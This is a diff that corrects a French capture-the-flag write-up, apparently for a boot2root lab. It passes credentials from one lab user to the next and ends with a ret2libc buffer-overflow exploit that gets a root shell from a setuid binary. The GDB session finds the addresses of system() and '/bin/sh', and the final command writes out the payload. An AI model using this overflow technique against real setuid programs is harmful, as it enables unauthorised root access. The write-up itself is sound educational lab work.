@@ -452,9 +452,9 @@ Good work!  On to the next...
 Congratulations! You've defused the bomb!
 ```
 
-Une fois que nous arrivons à désamorsé la bomb, toutes les réponse forme le mot de passe du login `thor`
+Une fois que nous arrivons à désamorser la bomb, toutes les réponses forment le mot de passe du login `thor`
 
-Nous obtenons donc de nouvel indentifiant, ceux de `thor - Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+Nous obtenons donc de nouveaux indentifiants, ceux de `thor - Publicspeakingisveryeasy.126241207201b2149opekmq426135`
 
 ## Étape 8 - Ssh via thor:
 
@@ -484,9 +484,9 @@ Can you digest the message? :)
 
 Le fichier `turtle` écrivait un mot si nous reconsituions les étapes décrites dans le fichier, ce mot était `SLASH`.
 
-À la fin du fichier turtle, il nous dit de créer un `message digest` de mot `SLASH`.
+À la fin du fichier turtle, l'indice `digest` signifie qu'il faut faire un `MD5` (message digest) de `SLASH`.
 
-Message disgest est un algo de hash plus souvent nommé sous le nom de `md5`, nous l'avons donc hasher avec cet algo de hashage, le resultat de `md5` nous donnais le mot de passe du login `zaz`.
+Le resultat de `md5` nous donnais le mot de passe du login `zaz`.
 
 Voici donc les nouveaux identifiats, ceux de `zaz - 646da671ca01bb5d84dbb5fb2238dc8e`
 
@@ -510,11 +510,11 @@ Pour que la fail du strcpy puissent nous donner les accèss à root nous devons 
 -rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
 ```
 
-Le binaire a donc bien les droits d'exécution root, la faille que nous allons essayer d'exploiter pourrais nous donner les droits root.
+Le binaire a donc bien les droits d'exécution root, la faille que nous allons essayer d'exploiter pourrais nous donner les accès root.
 
 Ce que nous allons essayer de faire est de lancer un terminal via la fonction system de la libc en écrivant sur l'overflow (au delà de 140 chars) l'adresse de cette fonction et l'adresse de la variable d'environnement shell que l'on veut exécuter. Cela va nous permettre d'avoir un terminal avec accès root car le binaire qui lance ce terminal a l'accès root.
 
-On a remarqué que le programme avait un segfault quand on lui envoyait une chaine de plus de 140 caractères. On a lancé le binaire avec `GDB` et on a mis un break point pour trouver l'adresse de la fonction `system` et de la variable d'environement `SHELL`.
+On a remarqué que le programme avait un segfault quand on lui envoyait une chaine de plus de 140 caractères. On a lancé le binaire avec `GDB` et on récupéré l'adresse de la fonction `system` et de la variable d'environement `SHELL`.
 
 ```sh
 #> gdb -q exploit_me
@@ -551,29 +551,21 @@ Starting program: /home/zaz/exploit_me $(python -c 'print "a"*142')
 Breakpoint 1, 0x08048425 in main ()
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
-(gdb) x/500s $esp
-0xbffff5e0:	 "\360\365\377\277^\370\377\277\001"
-0xbffff5ec:	 "I<\354\267", 'a' <repeats 142 times>
-[...]
-0xbffff849:	 "/home/zaz/exploit_me"
-0xbffff85e:	 'a' <repeats 142 times>
-0xbffff8ed:	 "SHELL=/bin/bash"
-0xbffff8fd:	 "TERM=xterm-256color"
-0xbffff911:	 "SSH_CLIENT=192.168.56.1 49382 22"
-0xbffff932:	 "SSH_TTY=/dev/pts/0"
-0xbffff945:	 "USER=zaz"
-[...]
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xb7f8cc58
+warning: Unable to access target memory at 0xb7fd3160, halting search.
+1 pattern found.
 ```
 
 Dans le retour de gdb nous avons toutes les informations pour procéder à l'exploitation du binaire.
 
-Les lignes suivantes contienents les adresses mémoires que nous pouvons utiliser pour exploiter le binaire, `0xb7e6b060` pour la fonction system et `0xbffff8ed` pour la variable d'environement.
+Les lignes suivantes contienents les adresses mémoires que nous pouvons utiliser pour exploiter le binaire, `0xb7e6b060` pour la fonction system et `0xb7f8cc58` pour la variable d'environement.
 
  * `$1 = {<text variable, no debug info>} 0xb7e6b060 <system>` pour la fonction `system`
 
- * `0xbffff8ed:	 "SHELL=/bin/bash"` pour la variable d'environnement `SHELL`
+ * `0xb7f8cc58` pour la string `/bin/sh`
 
-On lance alors le binaire avec la chaine preparé pour exploiter la faille de sécurité et ouvrir un shell avec les droits root.
+On lance alors le binaire avec l'adresse de la chaine `bin/sh` pour exploiter la faille de sécurité et ouvrir un shell avec les droits root.
 
 ```sh
 ./exploit_me `python -c "print('0' * 140 + '\x60\xb0\xe6\xb7' + 'OSEF' + '\x58\xcc\xf8\xb7')"`
